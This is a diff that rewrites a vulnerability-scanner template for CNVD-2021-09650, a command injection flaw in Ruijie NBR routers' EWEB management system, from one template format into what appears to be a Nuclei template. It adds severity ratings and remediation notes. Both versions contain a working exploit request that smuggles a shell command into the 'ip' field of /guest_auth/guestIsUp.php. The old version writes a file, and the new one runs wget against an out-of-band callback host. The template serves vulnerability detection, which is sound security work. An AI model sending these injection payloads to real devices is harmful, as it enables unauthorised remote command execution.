@@ -1,30 +1,41 @@
 id: CNVD-2021-09650
-
 info:
-    name: 锐捷网络股份有限公司NBR路由器EWEB网管系统存在命令执行漏洞
-    author: alexto
-    severity: critical
-    description: |
-        app="Ruijie-EWEB网管系统"
-    reference:
-        - https://xz.aliyun.com/t/9016?page=1
-        - https://www.ruijie.com.cn/gy/xw-aqtg-gw/86747/
-        - http://j0j0xsec.top/2021/04/22/%E9%94%90%E6%8D%B7EWEB%E7%BD%91%E5%85%B3%E5%B9%B3%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/
+  name: Ruijie EWEB Gateway Platform - Remote Command Injection
+  author:
+  - l0ne1y
+  tags:
+  - ruijie
+  - cnvd
+  - cnvd2021
+  - rce
+  description: |-
+    锐捷网络股份有限公司NBR路由器EWEB网管系统存在命令执行漏洞
+    锐捷网络是一家拥有包括交换机、路由器、软件、安全防火墙、无线产品、存储等全系列的网络设备产品线及解决方案的专业化网络厂商。
 
-set:
-    payload: randomLowercase(20)
-    randstr: randomLowercase(10)
-rules:
-    r0:
-        request:
-            method: POST
-            path: /guest_auth/guestIsUp.php
-            body: |
-                mac=1&ip=127.0.0.1|echo '{{payload}}' > {{randstr}}.txt
-        expression: response.status == 200
-    r1:
-        request:
-            method: GET
-            path: /guest_auth/{{randstr}}.txt
-        expression: response.status == 200 && response.body.bcontains(bytes(payload))
-expression: r0() && r1()
+    锐捷网络股份有限公司NBR路由器EWEB网管系统存在命令执行漏洞，攻击者可利用该漏洞获取服务器控制权限。
+  reference:
+  - http://j0j0xsec.top/2021/04/22/%e9%94%90%e6%8d%b7eweb%e7%bd%91%e5%85%b3%e5%b9%b3%e5%8f%b0%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e/
+  severity: critical
+  classification:
+    cwe-id:
+    - cwe-77
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+  remediation: |-
+    官方修复方案：
+    1.厂商已发布了漏洞修复程序，请及时关注更新：
+    https://www.ruijie.com.cn/gy/xw-aqtg-gw/86747/
+requests:
+- matchers:
+  - type: word
+    part: interactsh_protocol
+    name: http
+    words:
+    - http
+  raw:
+  - |
+    POST /guest_auth/guestIsUp.php
+    Host: {{Hostname}}
+
+    mac=1&ip=127.0.0.1|wget {{interactsh-url}}
+  unsafe: true
